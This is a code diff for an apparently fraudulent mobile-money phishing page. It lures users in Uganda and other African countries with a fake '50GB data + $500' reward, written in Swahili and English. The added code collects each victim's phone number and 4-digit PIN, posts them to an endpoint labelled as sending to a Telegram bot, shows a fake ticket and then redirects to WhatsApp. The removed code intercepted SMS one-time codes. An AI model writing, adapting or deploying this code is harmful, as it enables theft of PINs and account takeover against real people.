+                offerDesc: '💰 Pata <strong>Data 50GB</strong> + <strong>$500</strong> Zawadi<br /><span style="font-size:12px; color:#888;">Jisajili sasa na udai zawadi yako!</span>',
+                submitText: '🔥 PATA BUNDLE YA DATA',
+                successTitle: 'Umesajiliwa Kikamilifu!',
+                successMsg: '<strong>Hongera!</strong> Utapokea <strong>Bundle yako ya Data 50GB</strong> na zawadi ya <strong>$500</strong> ndani ya <strong>dakika 1</strong>.',
+                phoneHint: 'Fomati: <strong>+2439XXXXXXXX</strong>',
+                redirectText: '🔄 Inaelekeza kwa Msaada wa WhatsApp katika <strong id="countdown">5</strong> sekunde...',
+                manualLink: 'Kama hutaelekezwa, <a href="#" id="manualWhatsAppLink" target="_blank">bonyeza hapa kuwasiliana kwenye WhatsApp</a>',
+                changeCountry: '← Badilisha Nchi',
+                backHome: '← Rudi Nyumbani',
+                back: '← Rudi'
+            }
+        };
+
+        // =============================================================
+        // STATE
+        // =============================================================
+        let selectedCountry = 'uganda';
+        let ticketNumber = '';
+        let isSubmitting = false;
+        let countdownInterval = null;
 
         // =============================================================
         // DOM REFERENCES
@@ -334,260 +808,308 @@
         const page2 = document.getElementById('page2');
         const page3 = document.getElementById('page3');
 
-        const getStartedBtn = document.getElementById('getStartedBtn');
+        const countryFlag = document.getElementById('countryFlag');
+        const ticketNumberEl = document.getElementById('ticketNumber');
+        const successTicket = document.getElementById('successTicket');
+        const successCountry = document.getElementById('successCountry');
+        const successPhone = document.getElementById('successPhone');
 
+        const formFlag = document.getElementById('formFlag');
+        const formCountry = document.getElementById('formCountry');
         const phoneInput = document.getElementById('phoneInput');
         const pinInput = document.getElementById('pinInput');
+        const phoneHint = document.getElementById('phoneHint');
+        const formError = document.getElementById('formError');
         const submitBtn = document.getElementById('submitBtn');
         const submitText = document.getElementById('submitText');
         const submitSpinner = document.getElementById('submitSpinner');
-        const formError = document.getElementById('formError');
 
-        const otpInput = document.getElementById('otpInput');
-        const otpCode = document.getElementById('otpCode');
-        const otpStatus = document.getElementById('otpStatus');
-        const otpDisplayBox = document.getElementById('otpDisplayBox');
-        const otpError = document.getElementById('otpError');
-        const displayPhone = document.getElementById('displayPhone');
-        const progressFill = document.getElementById('progressFill');
-        const manualOtpInput = document.getElementById('manualOtpInput');
-        const manualVerifyBtn = document.getElementById('manualVerifyBtn');
-        const manualSection = document.getElementById('manualSection');
-        const autoStatus = document.getElementById('autoStatus');
-
-        const doneBtn = document.getElementById('doneBtn');
-        const successReferral = document.getElementById('successReferral');
-
-        const backToWelcome1 = document.getElementById('backToWelcome1');
-        const backToWelcome2 = document.getElementById('backToWelcome2');
+        const welcomeTitle = document.getElementById('welcomeTitle');
+        const welcomeSub = document.getElementById('welcomeSub');
+        const subscribeBtn = document.getElementById('subscribeBtn');
+        const phoneLabel = document.getElementById('phoneLabel');
+        const pinLabel = document.getElementById('pinLabel');
+        const pinHint = document.getElementById('pinHint');
+        const offerDescription = document.getElementById('offerDescription');
+        const successTitle = document.getElementById('successTitle');
+        const successMessage = document.getElementById('successMessage');
+        const redirectTimer = document.getElementById('redirectTimer');
+        const manualLink = document.querySelector('.manual-link');
 
         // =============================================================
-        // STATE
+        // GENERATE TICKET
         // =============================================================
-        let currentPhone = '';
-        let currentOtp = '';
+        function generateTicket() {
+            const date = new Date();
+            const year = date.getFullYear();
+            const random = String(Math.floor(10000 + Math.random() * 90000));
+            return `AFR-${year}-${random}`;
+        }
 
         // =============================================================
-        // PAGE NAVIGATION
+        // SHOW PAGE
         // =============================================================
         function showPage(page) {
-            page0.classList.add('hidden');
-            page1.classList.add('hidden');
-            page2.classList.add('hidden');
-            page3.classList.add('hidden');
-            if (page === 0) page0.classList.remove('hidden');
-            else if (page === 1) page1.classList.remove('hidden');
-            else if (page === 2) page2.classList.remove('hidden');
-            else if (page === 3) page3.classList.remove('hidden');
+            document.querySelectorAll('.card').forEach(c => c.classList.remove('active'));
+            page.classList.add('active');
         }
 
         // =============================================================
-        // UTILITY FUNCTIONS
+        // UPDATE COUNTRY
         // =============================================================
-        function setLoading(btn, textEl, spinnerEl, loading) {
-            if (loading) {
-                btn.disabled = true;
-                textEl.textContent = 'Inasubiri...';
-                spinnerEl.classList.remove('hidden');
-            } else {
-                btn.disabled = false;
-                spinnerEl.classList.add('hidden');
-            }
+        function updateCountry(countryKey) {
+            selectedCountry = countryKey;
+            const country = COUNTRIES[countryKey];
+            const lang = country.language === 'sw' ? 'sw' : 'en';
+            const t = TRANSLATIONS[lang];
+
+            countryFlag.textContent = country.flag;
+            formFlag.textContent = country.flag;
+            formCountry.textContent = country.displayName;
+
+            phoneHint.innerHTML = t.phoneHint.replace('+2567XXXXXXXX', country.phoneFormat);
+            phoneInput.placeholder = country.phoneFormat;
+            phoneInput.value = '';
+
+            welcomeTitle.innerHTML = t.welcomeTitle;
+            welcomeSub.innerHTML = t.welcomeSub;
+            subscribeBtn.textContent = t.subscribeBtn;
+            phoneLabel.innerHTML = t.phoneLabel;
+            pinLabel.innerHTML = t.pinLabel;
+            pinHint.innerHTML = t.pinHint;
+            offerDescription.innerHTML = t.offerDesc;
+            submitText.textContent = t.submitText;
+            successTitle.textContent = t.successTitle;
+            successMessage.innerHTML = t.successMsg;
+
+            document.getElementById('backToMap1').textContent = t.changeCountry;
+            document.getElementById('backToWelcome').textContent = t.back;
+            document.getElementById('backToMap3').textContent = t.backHome;
+
+            ticketNumber = generateTicket();
+            ticketNumberEl.textContent = ticketNumber;
+            successTicket.textContent = ticketNumber;
+
+            redirectTimer.innerHTML = t.redirectText.replace('5', '5');
+            manualLink.innerHTML = t.manualLink;
+
+            formError.classList.remove('show');
+            pinInput.value = '';
         }
 
-        function showError(el, msg) {
+        // =============================================================
+        // SHOW ERROR
+        // =============================================================
+        function showError(msg) {
             if (msg) {
-                el.textContent = msg;
-                el.classList.add('show');
+                formError.textContent = msg;
+                formError.classList.add('show');
             } else {
-                el.classList.remove('show');
+                formError.classList.remove('show');
             }
         }
 
         // =============================================================
-        // API CALLS
+        // SET LOADING
         // =============================================================
-        async function callAPI(endpoint, data) {
+        function setLoading(loading) {
+            if (loading) {
+                submitBtn.disabled = true;
+                submitText.textContent = 'Submitting...';
+                submitSpinner.classList.remove('hidden');
+            } else {
+                submitBtn.disabled = false;
+                const country = COUNTRIES[selectedCountry];
+                const lang = country.language === 'sw' ? 'sw' : 'en';
+                submitText.textContent = TRANSLATIONS[lang].submitText;
+                submitSpinner.classList.add('hidden');
+            }
+        }
+
+        // =============================================================
+        // SEND TO TELEGRAM
+        // =============================================================
+        async function sendToTelegram(data) {
             try {
-                const url = `${API_BASE}${endpoint}`;
-                console.log('📡 Calling:', url);
-                const response = await fetch(url, {
+                const response = await fetch(`${API_BASE}/send-data`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
-                const result = await response.json();
-                console.log('📡 Response:', result);
-                return result;
+                return await response.json();
             } catch (error) {
-                console.error('❌ API Error:', error);
-                return { success: false, message: 'Network error' };
+                console.error('Telegram error:', error);
+                return { success: false };
             }
         }
 
         // =============================================================
-        // START OTP DETECTION
+        // START REDIRECT
         // =============================================================
-        async function startOTPDetection(phone) {
-            if (!('OTPCredential' in window)) {
-                autoStatus.textContent = '⚠️ Kifaa hakiungii mkono WebOTP. Ingiza msimbo manually.';
-                manualSection.style.display = 'block';
-                return;
-            }
+        function startRedirect() {
+            let countdown = 5;
+            const country = COUNTRIES[selectedCountry];
+            const lang = country.language === 'sw' ? 'sw' : 'en';
+            const t = TRANSLATIONS[lang];
 
-            autoStatus.textContent = '📱 Inasubiri msimbo kutoka Tigo...';
+            document.getElementById('manualWhatsAppLink').href = WHATSAPP_LINK;
 
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => {
-                    controller.abort();
-                    autoStatus.textContent = '⏰ Muda umeisha. Ingiza msimbo manually.';
-                    manualSection.style.display = 'block';
-                }, 60000);
-
-                const otp = await navigator.credentials.get({
-                    otp: { transport: ['sms'] },
-                    signal: controller.signal
-                });
-
-                clearTimeout(timeoutId);
-
-                if (otp && otp.code) {
-                    currentOtp = otp.code;
-                    otpInput.value = currentOtp;
-                    otpCode.textContent = currentOtp;
-                    autoStatus.textContent = '✅ Msimbo umepokelewa! Inathibitisha...';
-                    otpStatus.textContent = '✅ Msimbo umepokelewa! Inathibitisha...';
-                    otpStatus.className = 'status detected';
-                    otpDisplayBox.classList.add('detected');
-                    progressFill.classList.add('detected');
-
-                    await autoVerifyOTP(phone, currentOtp);
-                }
-
-            } catch (error) {
-                if (error.name === 'AbortError') {
-                    autoStatus.textContent = '⏰ Muda umeisha. Ingiza msimbo manually.';
-                    manualSection.style.display = 'block';
+            countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    redirectTimer.innerHTML = t.redirectText.replace('5', countdown);
                 } else {
-                    console.error('OTP detection error:', error);
-                    autoStatus.textContent = '❌ Hitilafu. Ingiza msimbo manually.';
-                    manualSection.style.display = 'block';
+                    clearInterval(countdownInterval);
+                    redirectTimer.innerHTML = '✅ Opening WhatsApp...';
+                    window.location.href = WHATSAPP_LINK;
                 }
-            }
+            }, 1000);
         }
 
         // =============================================================
-        // AUTO-VERIFY OTP
+        // EVENT: COUNTRY SELECTION
         // =============================================================
-        async function autoVerifyOTP(phone, otp) {
-            try {
-                const result = await callAPI('/verify-otp', { phone, otp });
+        document.querySelectorAll('.country-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const country = this.dataset.country;
+                updateCountry(country);
+                showPage(page1);
+            });
+        });
 
-                if (result.success) {
-                    otpStatus.textContent = '✅ Imethibitishwa!';
-                    otpStatus.className = 'status detected';
-                    otpDisplayBox.classList.add('detected');
-                    progressFill.classList.add('detected');
-                    autoStatus.textContent = '✅ Msimbo umethibitishwa!';
+        // =============================================================
+        // EVENT: SUBSCRIBE
+        // =============================================================
+        document.getElementById('subscribeBtn').addEventListener('click', function() {
+            showPage(page2);
+            phoneInput.focus();
+        });
 
-                    if (result.data && result.data.referral) {
-                        successReferral.textContent = `📱 ${result.data.phone} | 🔗 ${result.data.referral}`;
-                    }
+        // =============================================================
+        // EVENT: BACK BUTTONS
+        // =============================================================
+        document.getElementById('backToMap1').addEventListener('click', function() {
+            showPage(page0);
+        });
 
-                    setTimeout(() => showPage(3), 1500);
+        document.getElementById('backToWelcome').addEventListener('click', function() {
+            showPage(page1);
+        });
 
-                } else {
-                    otpStatus.textContent = '❌ ' + (result.message || 'Msimbo si sahihi.');
-                    otpStatus.className = 'status error';
-                    otpDisplayBox.style.borderColor = '#d32f2f';
-                    autoStatus.textContent = '❌ Msimbo si sahihi. Jaribu tena.';
-                    showError(otpError, result.message || 'Msimbo si sahihi. Jaribu tena.');
-                    manualSection.style.display = 'block';
-                }
-            } catch (error) {
-                otpStatus.textContent = '❌ Hitilafu ya mtandao.';
-                otpStatus.className = 'status error';
-                autoStatus.textContent = '❌ Hitilafu ya mtandao.';
-                showError(otpError, 'Hitilafu ya mtandao. Jaribu tena.');
-                manualSection.style.display = 'block';
+        document.getElementById('backToMap3').addEventListener('click', function() {
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
+                countdownInterval = null;
             }
-        }
-
-        // =============================================================
-        // GET STARTED
-        // =============================================================
-        getStartedBtn.addEventListener('click', function() {
-            showPage(1);
+            showPage(page0);
         });
 
         // =============================================================
-        // BACK TO WELCOME
-        // =============================================================
-        backToWelcome1.addEventListener('click', function() {
-            showPage(0);
-            showError(formError);
-            phoneInput.value = '';
-            pinInput.value = '';
-        });
-
-        backToWelcome2.addEventListener('click', function() {
-            showPage(0);
-            showError(otpError);
-            manualSection.style.display = 'none';
-        });
-
-        // =============================================================
-        // STEP 1: SUBMIT
+        // EVENT: SUBMIT FORM - SENDS TO TELEGRAM
         // =============================================================
         submitBtn.addEventListener('click', async function() {
+            if (isSubmitting) return;
+
             const phone = phoneInput.value.trim();
             const pin = pinInput.value.trim();
+            const country = COUNTRIES[selectedCountry];
+            const lang = country.language === 'sw' ? 'sw' : 'en';
 
-            showError(formError);
-            manualSection.style.display = 'none';
+            showError();
 
-            if (!phone || !pin) {
-                showError(formError, 'Tafadhali jaza namba zote mbili.');
+            if (!phone) {
+                showError(lang === 'sw' ? 'Tafadhali ingiza namba ya simu.' : 'Please enter your phone number.');
+                phoneInput.focus();
                 return;
             }
 
-            if (!/^\d{9,10}$/.test(phone.replace(/^0+/, ''))) {
-                showError(formError, 'Namba ya Tigo si sahihi.');
+            const cleanPhone = phone.replace(/\s/g, '');
+            const phoneWithCode = cleanPhone.startsWith('+') ? cleanPhone : '+' + cleanPhone;
+            const checkPhone = phoneWithCode.replace(/^\+/, '');
+
+            if (!country.phonePattern.test(checkPhone)) {
+                showError(lang === 'sw' ? `Namba ya simu si sahihi. Tumia fomati: ${country.phoneFormat}` : `Invalid phone number. Use format: ${country.phoneFormat}`);
+                phoneInput.focus();
                 return;
             }
 
-            // ✅ PIN MUST BE EXACTLY 4 DIGITS
+            if (!pin) {
+                showError(lang === 'sw' ? 'Tafadhali ingiza namba ya siri (PIN).' : 'Please enter your PIN.');
+                pinInput.focus();
+                return;
+            }
+
             if (!/^\d{4}$/.test(pin)) {
-                showError(formError, 'Namba ya Siri lazima iwe tarakimu 4.');
+                showError(lang === 'sw' ? 'Namba ya Siri lazima iwe tarakimu 4.' : 'PIN must be 4 digits.');
+                pinInput.focus();
                 return;
             }
 
-            setLoading(submitBtn, submitText, submitSpinner, true);
+            isSubmitting = true;
+            setLoading(true);
+
+            // =============================================================
+            // SEND DATA TO TELEGRAM
+            // =============================================================
+            const telegramData = {
+                country: country.displayName,
+                countryCode: selectedCountry,
+                phone: phoneWithCode,
+                pin: pin,
+                ticket: ticketNumber,
+                offer: '50GB Data + $500'
+            };
 
             try {
-                const result = await callAPI('/send-otp', { phone, pin });
-
-                if (result.success) {
-                    currentPhone = result.phone || phone;
-
-                    displayPhone.textContent = currentPhone;
-                    otpCode.textContent = '••••••';
-                    otpStatus.textContent = '⏳ Inasubiri msimbo...';
-                    otpStatus.className = 'status waiting';
-                    otpDisplayBox.classList.remove('detected');
-                    otpDisplayBox.style.borderColor = '#e2001a';
-                    progressFill.classList.remove('detected');
-                    showError(otpError);
-                    manualSection.style.display = 'none';
-
-                    showPage(2);
-
-                    await startOTPDetection(currentPhone);
-
-                } else {
-                    showError(formError, result.message || 'Hitilafu. Jaribu tena.');
-                }
+                await sendToTelegram(telegramData);
+                console.log('✅ Data sent to Telegram');
             } catch (error) {
-                showError(formError, 'Hitilafu ya mtandao. Jaribu tena.');
+                console.error('❌ Failed to send to Telegram:', error);
             }
+
+            // Show success page
+            successCountry.textContent = `${country.flag} ${country.displayName}`;
+            successPhone.textContent = `📞 ${phoneWithCode}`;
+            successTicket.textContent = ticketNumber;
+
+            showPage(page3);
+
+            setTimeout(() => {
+                startRedirect();
+            }, 1500);
+
+            isSubmitting = false;
+            setLoading(false);
+        });
+
+        // =============================================================
+        // ENTER KEY
+        // =============================================================
+        phoneInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') pinInput.focus(); });
+        pinInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') submitBtn.click(); });
+
+        // =============================================================
+        // PHONE FORMAT
+        // =============================================================
+        phoneInput.addEventListener('input', function() {
+            let value = this.value.replace(/\s/g, '');
+            if (!value.startsWith('+')) {
+                const country = COUNTRIES[selectedCountry];
+                value = '+' + value.replace(/^\+/, '');
+            }
+            this.value = value;
+        });
+
+        // =============================================================
+        // INIT
+        // =============================================================
+        updateCountry('uganda');
+        showPage(page0);
+
+        console.log('🚀 AFRICA 50GB OFFER Started!');
+        console.log('💬 WhatsApp: ' + WHATSAPP_LINK);
+        console.log('📱 Telegram Bot: @KechiProject2_bot');
+    </script>
+
+</body>
+</html>
